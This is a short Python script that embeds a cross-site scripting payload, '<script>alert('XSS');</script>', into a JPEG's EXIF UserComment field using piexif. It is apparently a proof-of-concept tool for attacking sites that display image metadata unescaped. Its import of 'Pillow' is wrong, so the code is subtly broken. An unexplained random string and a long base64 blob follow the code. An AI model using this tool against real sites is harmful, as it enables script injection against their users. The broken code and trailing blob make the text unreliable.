from Pillow import Image
import piexif
def embed_xss_payload(image_path, output_path, payload):
    try:
        img = Image.open(image_path)
        exif_dict = piexif.load(img.info.get("exif", b""))
        payload_bytes = payload.encode("utf-8")
        exif_dict["Exif"][piexif.ExifIFD.UserComment] = payload_bytes
        exif_bytes = piexif.dump(exif_dict)
        img.save(output_path, "jpeg", exif=exif_bytes)
        print(f"Payload successfully embedded into {output_path}")
    except Exception as e:
        print(f"Error embedding payload: {e}")
if __name__ == "__main__":
    input_image = "input.jpg"
    output_image = "output_with_payload.jpg"
    xss_payload = "<script>alert('XSS');</script>"
    embed_xss_payload(input_image, output_image, xss_payload)
XJYx8G7YKNa7&jmw3B*b


to4eGI62vD0ZXFwaDf1xeWSKbyWdjWl14Zrz37vPFNqvYAn2zh0uJq9gCfbOHS4mYaxbm3RDytys+Z5IKlg/f4PBm6wK4+u0+b666TeRhFx0H5CR3f12NwzvXh/2wtw4C2aKqCNkQhJl9gp4NfA4+fPbUcmCPEq55Pul7pkMhp6tBr04D9wkZLAPFWIBrjenxJYklbZ9kQUE+90O6khnt3QSkgghyIRVxZZi1G9636bcyG1UhmAnlsMZUs5guQ7MSd+2bhZANAPoEWq2lUlwmbf2f6hTL07I3hnUTbzIfxR3biqGvx8oaihdW0rldR1U2pKy8fhR1tGPOWUyu5qQ/1TfQicNeob0OyyIys5P2aCG5F06rTPrFTXKq4F/JCBHik+wxCYfgydriY6FobITALDej2vhIoPd7SAm+dBj2sCAjEh8/xd+wGw/ucO9gz7mUV1MpdL0NSXJeNadrSKvjnEqMx+4M4ONb6tnEvONhpONLhjgQdIgR7DnG0C81FEH1MO9yp98V7ZixfeFxRa2orIoy0UDf8OkBXyrtsHCCdpWAk+2tcgtQ3t22mesQGlQ5cX+Efyuu7t65g/zvashGnl+xEUwUKcWjPbNwRNz8Tb2gB7bYvbAXcegkap1qdcsJmdt3tK9YHzMD7P5idlLh13HYcXo3/TzFxz5siFQBxra2GsAW6qentRPHgYnjE0knJZ2K8Q2dNSlaviAxx9UaFX5yUg3NTyqYML5EXUwDJTeA0s6h5m9Jy6xhiBAiWXVI2XDh+jGNfqY5i4qorJ9H/LEUDYEHkpqnODDbg9cT5J1czNEVfRj0w==
